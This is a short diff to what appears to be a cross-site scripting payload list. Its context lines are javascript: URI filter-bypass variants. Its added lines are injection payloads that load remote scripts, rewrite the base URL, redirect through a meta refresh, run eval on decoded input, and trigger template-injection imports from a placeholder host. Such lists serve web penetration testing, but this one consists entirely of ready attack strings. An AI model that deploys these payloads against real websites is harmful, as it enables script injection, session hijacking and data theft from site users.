@@ -1,6 +1,12 @@
 ja%20vascri%20pt:alert(1)
 jav%0Aascri%0Apt:alert(1)
 jav%0Dascri%0Dpt:alert(1)
+"""><script src="{https://youtube.com}/script.js"></script> 
+""><img src="x" onerror="eval(atob(this.id))" id="{alert(1)}"> 
+"><script>$.getScript("{https://youtube.com}") </script> 
+<base href="{https://youtube.com}" /> 
+<meta http-equiv="refresh" content="0; url={https://youtube.com}" /> 
+{{constructor.constructor("import('{https://youtube.com}')")()}}
 jav%09ascri%09pt:alert(1)
 %19javascript:alert(1)
 javascript://%0Aalert(1)
